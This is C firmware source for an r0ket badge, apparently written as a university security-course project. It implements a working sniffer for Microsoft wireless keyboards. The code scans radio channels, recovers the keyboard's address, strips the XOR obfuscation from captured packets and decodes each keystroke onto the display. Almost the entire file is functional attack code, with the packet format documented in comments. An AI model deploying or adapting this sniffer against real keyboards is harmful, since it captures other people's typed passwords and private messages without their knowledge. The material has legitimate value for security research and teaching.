// Keyboard Sniffer

// This program was created by Dirk Mattes, Clemens Seibold, Florian
// Kaase and Alexander Bobach as a semester project for the
// IT-Security basics lecture hold by Dr. Wolf Müller at the Humboldt-
// Universität zu Berlin. It's based on the work of Travis Goodspeed
// (sniffing keyboards with the next hope badge) and previous tries by
// Katja Wolf and Fabian Kaczmarczyck. We worked with a Microsoft
// Wireless Comfort Keyboard 5000 as test keyboard. In lack of further
// test objects, we can't assure it's working with other keyboards as well.
// Configurations may have to be adjusted.
//
// Known problems:
//
// Sometimes keyboard receives not nearly as much pakets as have been sent.
// To bypass this problem with Microsoft Wireless Comfort Keyboard 5000:
//
// 1) Remove batteries from Keyboard.
// 2) Plug Reveiver into Computer. Switch r0ket on.
// 3) Put batteries back into keyboard.
//
// Even after this procedure it can occur that the device only
// notices a keyboard, if a key is hold. A finer configuration
// (#received packets, delay) can probably improve this.
//
// The right frequency can be interfered by another near frequency.
// The program then will get a wrong MAC-Address, assuming it's the
// right one. A better selection process should solve this problem
// (for example: first collect all addresses that come into question,
// then test for everyone, if pakets can be decoded right.
//
// 6. Aug 2012

#include <sysinit.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>

#include "funk/nrf24l01p.h"
#include "lcd/print.h"
#include "lcd/render.h"

#include "radi1.h"

#include "basic/basic.h"
#include "core/ssp/ssp.h"
#include "applications/radi1.h"

#define CS_LOW()    gpioSetValue(RB_SPI_NRF_CS, 0)
#define CS_HIGH()   gpioSetValue(RB_SPI_NRF_CS, 1)
#define CE_LOW()    gpioSetValue(RB_NRF_CE, 0)
#define CE_HIGH()   gpioSetValue(RB_NRF_CE, 1)


#define nrf_write_reg_long(reg, len, data) \
    nrf_write_long(C_W_REGISTER|(reg), len, data)

#define nrf_read_reg_long(reg, len, data) \
    nrf_read_long(C_R_REGISTER|(reg), len, data)

#define R_CONFIG_MASK_ALL (R_CONFIG_MASK_RX_DR \
                           | R_CONFIG_MASK_TX_DS \
                           | R_CONFIG_MASK_MAX_RT)

#define R_CONFIG_ENTER_RX_MODE (R_CONFIG_PWR_UP \
                                | R_CONFIG_PRIM_RX)

#define ADDR_SIZE 5             //number of bytes for address

// size of address storage (used for autotuning: collect MAC
// addresses, than look if one of them was received often enough it can
// be assumed as the keyboards address).
// If set too high, r0kets memory is too small and program cant be started.
#define ADDRC_SIZE 85


    uint EoA = 0;   //links to last entry in address storage
    uint Freq = 0;


void
display_payload(int x, int y, const uint8_t* payload, uint8_t payload_size)
{
    int xx = x;
    int yy = y;

    for (int i = 0; i != payload_size; ++i)
    {
        if (i != 0 && i % 4 == 0)
        {
            xx = x;
            yy += 8;
        }

        DoInt(xx, yy, payload[i]);

        xx += 3 * 8;
    }
}

addr_count * getAddress (uint8_t *address, addr_count * addressArray, uint8_t addr_size)
{
    int i,j;
    int flag;
    for (i = 0; i<=EoA; i++) {
        flag = 1;
        for (j=0;j<addr_size;j++) {
            if (addressArray[i].addr[j] != address[j]) {
                flag = 0;
            }
        }
        if (flag==1)
            return &addressArray[i];
    }
    return NULL;
}

int getAddressCount (int *address, addr_count * addressArray, uint8_t addr_size)
//returns Count of address
{
    int *tmp;
    int i;
    int j;
    int flag;
    for (i = 0; i<=EoA; i++) {
        flag = 1;
        tmp = address;
        for (j=0;j<addr_size;j++) {
            if ((*addressArray).addr[j] != *tmp)
                flag = 0;
            tmp++;
            addressArray++;
        }
        if (flag==1)
        return (*addressArray).count;
    }
    return 0;
}

int isvalid(uint8_t * address, uint8_t addr_size)
//1, if s contains noise (according to blacklist), else 0
{
    int i,j,offset;
    int flag;

    int blacklist [10][3] = {{0x55, 0x55, 0x55}, {0xaa,0xaa,0xaa},
                             {0x00,0x00,0x00}, {0xff,0xff,0xff},
                             {0x7f, 0xff, 0xff}, {0xaa,0xff,0xff},{0xab,0xff,0xff},
                             {0xaa,0xaa,0xff}, {0xaf,0xff,0xff},{0x5f,0xff,0xff}};
                   //blacklist borrowed from Travis Goodspeed

    for (i = 0; i < 10;i++) {
        for (offset = 0; offset <= addr_size - 3; offset++) {
            flag = 1;
            for (j = 0;j < 3;j++) {
                if (address[j+offset] != blacklist[i][j])
                    flag = 0;
                }
                if (flag == 1)
                    return 1;
            }
        }
    return 0;
}

addr_count * mostCounted(addr_count * addressArray) {
//looks in address storage for MAC address with most counts
    int i;
    int c = 0;
    int j = 0;
    for (i = 0; i <= EoA; i++) {
        if (addressArray[i].count > c) {
            c = addressArray[i].count;
            j = i;
        }
    }

    return &addressArray[j];
}

void addAddress (uint8_t * address, addr_count * addressArray, uint8_t addr_size)
//add new address to address storage
{
    if(isvalid(address, addr_size) != 0) //is address noise?
        return;
    EoA++;
    if (EoA >= ADDRC_SIZE)  //storage is full
        {
            EoA--;

            //lcdClear();
            //DoString(1,1,"AddressArray\n");
            //DoString(1,13,"too small\n");
            //lcdDisplay();
            //lcdClear();
            //while(1) {}       //TODO: better error handling
        }
        int i ;
        for (i=0;i<addr_size;i++)
        {
    addressArray[EoA].addr[i] = *address;
    address++;
    }
    address--;
    addressArray[EoA].count = 1;
}

//if address is already in storage, increase its count by 1
int updateCount (uint8_t *address, addr_count * addressArray, uint8_t addr_size)
{
    addr_count * p = getAddress (address, addressArray, addr_size);
    if (p!=NULL) {
        (p->count)++;
        return 1;
    }
    else {
        addAddress(address, addressArray, addr_size);
        return 0;
    }
}


int
read_payload(uint8_t* buffer, uint8_t buffer_size)
{
    // Read payload through SPI

    uint8_t size;
    nrf_read_long(C_R_RX_PL_WID, 1, &size);

    if (size == 0 || size > 32)
    {
        // Payload size out of range
        return -1;
    }

    if (size > buffer_size)
    {
        // Buffer smaller than payload size
        size = buffer_size;
    }

    nrf_read_pkt(size, buffer);

    return size;
}

void
setup_receive_mode(uint8_t channel, uint8_t payload_size,
                   const uint8_t* addr, uint8_t addr_size)
{
    // Power down
    nrf_write_reg(R_CONFIG, 0);

    // Disable Extended ShockBurst auto-acknowledgement
    nrf_write_reg(R_EN_AA, 0);

    // Enable RX pipe 0
    nrf_write_reg(R_EN_RXADDR, R_EN_RXADDR_ERX_P0);

    // Set packet width of RX pipe 0 to 16 bytes
    nrf_write_reg(R_RX_PW_P0, payload_size);

    // Set RX/TX address width to 5 bytes
    switch (addr_size) {
    case 3:
        nrf_write_reg(R_SETUP_AW, R_SETUP_AW_3);
        break;
    case 4:
        nrf_write_reg(R_SETUP_AW, R_SETUP_AW_4);
        break;
    case 5:
        nrf_write_reg(R_SETUP_AW, R_SETUP_AW_5);
        break;
    default:
        // Error
        return;
    }

    // Set RX pipe 0 address to the keyboard's MAC address (LSByte first)
    nrf_write_reg_long(R_RX_ADDR_P0, addr_size, addr);

    // Set channel
    nrf_write_reg(R_RF_CH, channel);

    // Set data rate to 2 Mbps
    nrf_write_reg(R_RF_SETUP,  R_RF_SETUP_RF_DR_HIGH);

    // Enable dynamic payload for RX/TX pipe 0
    nrf_write_reg(R_DYNPD, R_DYNPD_DPL_P0);
    nrf_write_reg(R_FEATURE, R_FEATURE_EN_DPL | R_FEATURE_EN_ACK_PAY);
    //nrf_write_reg(R_FEATURE, R_FEATURE_EN_DPL);

    // Mask interrupts, turn CRC off, enter RX mode
    // TODO: Why interrupts must be masked?
    nrf_write_reg(R_CONFIG, R_CONFIG_MASK_ALL | R_CONFIG_ENTER_RX_MODE);
}

void
receive_packets(addr_count * addressArray, uint8_t addr_size)
{
    static int counter = 0;

    nrf_set_ce(HIGH);

    for (;;)
    {
        const uint8_t status = nrf_read_reg(R_STATUS);
        //const uint8_t status = nrf_cmd_status(C_NOP);  // alternative

        if (status & R_STATUS_RX_DR)
        {
            const uint8_t buffer_size = 16;
            uint8_t buffer[buffer_size];

            int size = read_payload(buffer, buffer_size);

            if (size < 0 || size != buffer_size)
            {
                // Flush RX pipe 0
                nrf_cmd(C_FLUSH_RX);

                // TODO: better error handling

                lcdClear();
                DoString(0, 25, "Error");
                lcdRefresh();
                delayms(500);
            }

            // Clear RX_DR flag
            nrf_write_reg(R_STATUS, R_STATUS_RX_DR);

            ++counter;

            lcdClear();
            DoString(0, 0, "Packet");
            DoInt(52, 0, counter);
            DoInt(0, 8, status);
            DoInt(3 * 8, 8, size);


        //uint8_t addr[] = { 0xcd, 0xef, 0xee, 0x69, 0xa6 }; // LSByte first

        display_payload(0, 16, buffer, buffer_size);
            lcdRefresh();

        //for debugging:
        //if((buffer[0] == 0xa6 && buffer[1]==0x69))
        //{
            //lcdClear();
            //display_payload(0, 16, buffer, 5);
            //lcdRefresh();
                //delayms(500);
            //}

            updateCount(buffer, addressArray, addr_size);


        lcdRefresh();

            // Check FIFO status

            const uint8_t fifo_status
                = (nrf_read_reg(R_STATUS) & R_STATUS) >> 1;

            if (fifo_status != 0)
            {
                // No more payloads available for pipe 0
                break;
            }
        }
        else if (status == 0)
        {
            // No payloads available for pipe 0

            // Flush RX pipe 0
            nrf_cmd(C_FLUSH_RX);

            // Clear RX_DR flag
            nrf_write_reg(R_STATUS, R_STATUS_RX_DR);

            break;
        }
    }

    nrf_set_ce(LOW);
}

uint8_t
receive_packet(uint8_t* payload, uint8_t payload_size,
               const uint8_t* addr, uint8_t addr_size)
{
    const uint8_t status = nrf_read_reg(R_STATUS);
    //const uint8_t status = nrf_cmd_status(C_NOP);  // alternative


    if (!(status & R_STATUS_RX_DR))
    {
        // No payloads available for pipe 0

        if (status == 0)
        {
            // Flush RX pipe 0
            nrf_cmd(C_FLUSH_RX);

            // Clear RX_DR flag
            nrf_write_reg(R_STATUS, R_STATUS_RX_DR);
        }

        return 0;
    }

    const int received_size = read_payload(payload, payload_size);

    if (received_size < 0 || received_size > payload_size)
    {
        // Flush RX pipe 0
        nrf_cmd(C_FLUSH_RX);

        // Clear RX_DR flag
        nrf_write_reg(R_STATUS, R_STATUS_RX_DR);

        // TODO: better error handling

        lcdClear();
        DoString(0, 25, "Error");
        lcdRefresh();

        return 0;
    }

    // Clear RX_DR flag
    nrf_write_reg(R_STATUS, R_STATUS_RX_DR);

    return received_size;
}

void test_setup() {
    // initialize register
    nrf_write_reg(0x00, 0x00);
    nrf_write_reg(0x01, 0x00);
    nrf_write_reg(0x02, 0x01);

    nrf_write_reg(0x06, 0x09);
    nrf_write_reg(0x07, 0x78);

    nrf_write_reg(0x03, 0x03);

    nrf_write_reg(0x11, 0x10);      // paket length

    nrf_write_reg(0x00, 0x00);      // power off
    nrf_write_reg(0x01, 0x00);      // necessary to disable CRC
    nrf_write_reg(0x02, 0x01);      // open pipe 0

    nrf_write_reg(0x1C, 0x00);      // disabled dynamic payload length
    nrf_write_reg(0x1D, 0x00);      // disable several features

    nrf_write_reg(0x03, 0x00);      // set adress length to 2

    nrf_write_reg(0x00, 0x70 | 0x03);   // power on, receive on

    nrf_write_reg(0x05, 0x05);  // set frequency
    nrf_write_reg(0x06, 0x08);  // set rate
	// TODO: adjustable bitrate
    return;
}

const char*
decode_key(uint8_t* payload, uint8_t payload_size)
{
    struct key {
        uint8_t code;
        const char* key;
    };

    static const struct key key_map[] = {
        {0x00, "Null"},

        {0x04, "A"}, {0x05, "B"}, {0x06, "C"}, {0x07, "D"}, {0x08, "E"},
        {0x09, "F"}, {0x0a, "G"}, {0x0b, "H"}, {0x0c, "I"}, {0x0d, "J"},
        {0x0e, "K"}, {0x0f, "L"}, {0x10, "M"}, {0x11, "N"}, {0x12, "O"},
        {0x13, "P"}, {0x14, "Q"}, {0x15, "R"}, {0x16, "S"}, {0x17, "T"},
        {0x18, "U"}, {0x19, "V"}, {0x1a, "W"}, {0x1b, "X"}, {0x1d, "Y"},
        {0x1c, "Z"},

        {0x1e, "1"}, {0x1f, "2"}, {0x20, "3"}, {0x21, "4"}, {0x22, "5"},
        {0x23, "6"}, {0x24, "7"}, {0x25, "8"}, {0x26, "9"}, {0x27, "0"},

        {0x2d, "SHARP S"},
        {0x2f, "U UMLAUT"}, {0x33, "O UMLAUT"}, {0x34, "A UMLAUT"},

        {0x2e, "´"}, {0x30, "+"}, {0x32, "#"}, {0x35, "^"}, {0x36, ","},
        {0x37, "."}, {0x38, "-"}, {0x64, "<"},

        {0x28, "Return"},    {0x29, "Escape"}, {0x2a, "Backspace"},
        {0x2b, "Tabulator"}, {0x2c, "Space"},  {0x39, "CapsLock"},

        {0x3a, "F1"}, {0x3b, "F2"},  {0x3c, "F3"},  {0x3d, "F4"},
        {0x3e, "F5"}, {0x3f, "F6"},  {0x40, "F7"},  {0x41, "F8"},
        {0x42, "F9"}, {0x43, "F10"}, {0x44, "F11"}, {0x45, "F12"},

        {0x46, "Print"},  {0x47, "ScrollLock"}, {0x48, "Pause"},
        {0x49, "Insert"}, {0x4a, "Home"},       {0x4b, "PageUp"},
        {0x4c, "Delete"}, {0x4d, "End"},        {0x4e, "PageDown"},

        {0x4f, "Right"},  {0x50, "Left"}, {0x51, "Down"}, {0x52, "Up"},

        {0x53, "NumLock"}, {0x58, "KP Enter"}, {0x63, "KP Delete"},
        {0x54, "KP /"}, {0x55, "KP *"}, {0x56, "KP -"}, {0x57, "KP +"},
        {0x59, "KP 1"}, {0x5a, "KP 2"}, {0x5b, "KP 3"}, {0x5c, "KP 4"},
        {0x5d, "KP 5"}, {0x5e, "KP 6"}, {0x5f, "KP 7"}, {0x60, "KP 8"},
        {0x61, "KP 9"}, {0x62, "KP 0"},
    };

    if (payload_size != 0x10) {
        return "";
    }

    // TODO: Modifier, flags
    for (size_t i = 0; i != sizeof(key_map) / sizeof(key_map[0]); ++i) {
        if (key_map[i].code == payload[9])
            return key_map[i].key;
    }

    return "";
}

//find MAC address and frequency
addr_count * tune(uint8_t addr_size, uint8_t payload_size) {
    addr_count addressArray [ADDRC_SIZE];
    DoString(00,00,"Looking for");
    DoString(00,12,"frequency");
    lcdDisplay();
    delayms(500);
    lcdClear();
    lcdRefresh();

    nrf_init();
    test_setup();

    uint8_t addr[] = { 0xAA, 0x00, 0x00, 0x00, 0x00 }; // LSByte first

    addr_count *p;
    int flag = 1;

    for ( uint itera=0; itera<126; itera++ ){
        if (flag != 0) {
        // set frequency (ours: (0x05,0x05))
        nrf_write_reg(0x05, itera);

        lcdClear();
        DoString(0,12,"frequency:");
        DoInt(0,24,2400+itera);
        lcdDisplay();
        delayms(300);
        lcdClear();

        //change Preamble
        for (uint8_t changer = 0; changer < 2 && flag != 0; changer++) {

        EoA = 0;

        lcdClear();
        if (changer == 0) {
            addr[0] = 0xAA;
            DoString(0,12,"Preamble: 0xAA");
        }
        else {
            addr[0] = 0x55;
            DoString(0,12,"Preamble: 0x55");
        }

        lcdDisplay();
        delayms(500);
        lcdClear();

        nrf_write_reg_long(0x0A, 5, addr);
        nrf_read_reg_long(0x0A, 5, addr);

        //device is looking for x packets per frequency
        for (uint itera2 = 0;itera2 < 200 && EoA < ADDRC_SIZE;itera2++) {
            delayms(1);
        receive_packets(addressArray, addr_size);
        }

        p = mostCounted(addressArray);

        //when count of address is higher then this treshold value,
        //its assumed as the keyboards address
        if (p->count >= 3) {

            lcdClear();
            DoString(0,12,"found address,");
            DoString(0,24,"test...");
            lcdDisplay();
            delayms(1000);
            lcdClear();
            DoString (0,0,"Address:");
            DoInt(0,12,p->addr[0]);
            DoInt(0,24,p->addr[1]);
            DoInt(0,36,p->addr[2]);
            DoInt(0,48,p->addr[3]);
            DoInt(0,60,p->addr[4]);
            DoString(24,12,"Count:");
            DoInt(24,24,p->count);
            DoString(24,36,"EoA:");
            DoInt(24,48,EoA);
            lcdDisplay();
            delayms(3000);
            lcdClear();

            uint8_t zs = 0;
            uint8_t test_addr [] = {p->addr[4],p->addr[3],p->addr[2],p->addr[1],p->addr[0]};
            uint8_t payload[payload_size];
            setup_receive_mode(itera, payload_size, test_addr, addr_size);
            nrf_set_ce(HIGH);

            // try x times to receive packets with found settings
            for (uint8_t k = 0; k < 200; k++) {
                delayms(1);
                uint8_t z = receive_packet(payload, payload_size, test_addr, addr_size);
                zs = zs + z;
            }

            if (zs > 0) {
            flag = 0;
            Freq = itera;   //correct channel found and saved
            } else {
                lcdClear();
                DoString(0,12,"seems like");
                DoString(0,24,"wrong address.");
                DoString(0,36,"continue search...");
                lcdDisplay();
                delayms(1000);
                lcdClear();
                test_setup();
            }
        }
    }
    }
}

if(flag != 0) {
lcdClear();
        DoString(0,12,"nothing");
        DoString(0,24,"found");
        lcdDisplay();
        while(1){};
    }

    lcdClear();
    DoString (0,0,"take address:");
    DoInt(0,12,p->addr[0]);
    DoInt(0,24,p->addr[1]);
    DoInt(0,36,p->addr[2]);
    DoInt(0,48,p->addr[3]);
    DoInt(0,60,p->addr[4]);
    DoString(24,12,"Count:");
    DoInt(24,24,p->count);
    DoString(24,36,"EoA:");
    DoInt(24,48,EoA);
    lcdDisplay();
    delayms(3000);
    lcdClear();

    return p;
}


void
decode_payload(uint8_t* payload, uint8_t payload_size,
               const uint8_t* addr, uint8_t addr_size)
{
    // Example:
    //
    // 00 01 02 03   04 05 06 07 08 09 10 11 12 13 14 15  index
    //
    // 0a 78 09 01 | e5 ef ad 69 a6 c6 ef ee 69 a6 cd 0a  payload, LSB first
    //             | cd ef ee 69 a6|cd ef ee 69 a6|cd ef  address, LSB first, repeated
    //
    // 0a 78 09 01 | 28 00 43 00 00 0b 00 00 00 00 00 e5  Result (xor)
    // -- -- -- ??   -- -- -- -- -- -- ?? -- ?? ?? ?? --
    // |  |  |       |  |  |  |  |  |     |           |
    // |  |  Device  |  |  |  |  |  |     Flag4       Checksum
    // |  |  Model   |  |  |  |  |  HID-Code 0b = 'H'
    // |  Packet     |  |  |  |  Flag3
    // |  Type       |  |  |  Flag2
    // Device        |  |  Flag1
    // Type          |  Sequence number (high)
    //               Sequence number (low)

    // Flag1:
    //   0x43: default
    //   0x47: WinR (the key that shows three overlapping windows),
    //         F-Umsch,
    //         Calc (the key that shows a calculator)

    // Flag2:
    //   Bit 7: ??
    //   Bit 6: AltGr
    //   Bit 5: ShiftR
    //   Bit 4: CtrlR
    //   Bit 3: Win
    //   Bit 2: Alt
    //   Bit 1: ShiftL
    //   Bit 0: CtrlL
    //
    //   0x00: Menu, F-Umsch
    //   0x92: Calc (Bits 1, 4, 7)
    //   0xa2: WinR (Bits 1, 5, 7)

    // Flag3:
    //   0x00: default
    //   0x01: WinR, Calc
    //   0x03: F-Umsch
    //   0x65: Menu

    // Flag4:
    //   0x00: default
    //   0x01: WinR, F-Umsch

    // Start decoding after 4th byte
    const uint8_t start = 4;

    for (size_t i = start; i < payload_size; ++i) {
        payload[i] ^= addr[(i - start) % addr_size];
    }
}

void
main_radi1(void)
{
    nrf_init();
    const uint8_t payload_size = 16;

    addr_count * p = tune(ADDR_SIZE, payload_size);

    const uint8_t channel = Freq;
    const uint8_t addr_size = ADDR_SIZE;


    // for debugging: our test keyboard's MAC address (a6 69 ee ef cd)
    // const uint8_t addr[] = { 0xcd, 0xef, 0xee, 0x69, 0xa6 }; // LSByte first
    const uint8_t addr[] = { (*p).addr[4], (*p).addr[3], (*p).addr[2], (*p).addr[1], (*p).addr[0] }; // LSByte first

    setup_receive_mode(channel, payload_size, addr, addr_size);

    lcdClear();
    DoString(0, 0, "Sniff Mac:");
    DoInt(0,12,addr[0]);
    DoInt(0,24,addr[1]);
    DoInt(0,36,addr[2]);
    DoInt(0,48,addr[3]);
    DoInt(0,60,addr[4]);
    lcdRefresh();

    uint8_t payload[payload_size];
    uint8_t last_sequence_number = 0;
    int packet_counter = 0;

    nrf_set_ce(HIGH);
    for (;;)
    {
        delayms(1);

        const uint8_t received_size
            = receive_packet(payload, payload_size, addr, addr_size);

        if (received_size > 0) {
            decode_payload(payload, payload_size, addr, addr_size);

            // TODO: the sequence number is a 16-bit number
            const uint8_t sequence_number = payload[4];

            if (last_sequence_number != sequence_number) {
                last_sequence_number = sequence_number;
                ++packet_counter;

                lcdClear();
                DoString(0, 0, "Packet #");
                DoInt(7 * 8, 0, packet_counter);
                DoString(0, 8, "Size=");
                DoInt(4 * 8, 8, received_size);
                display_payload(0, 16, payload, received_size);
                DoString(0, 6 * 8, "Key=");
                DoString(3 * 8, 6 * 8, decode_key(payload, received_size));
                lcdRefresh();
            }
        }

        // Check FIFO status
        const uint8_t fifo_status
            = (nrf_read_reg(R_STATUS) & R_STATUS_RX_P_NO) >> 1;

        if (fifo_status == 0)
        {
            nrf_set_ce(LOW);
            delayms(1);
            nrf_set_ce(HIGH);
        }
    }

    nrf_off();
}
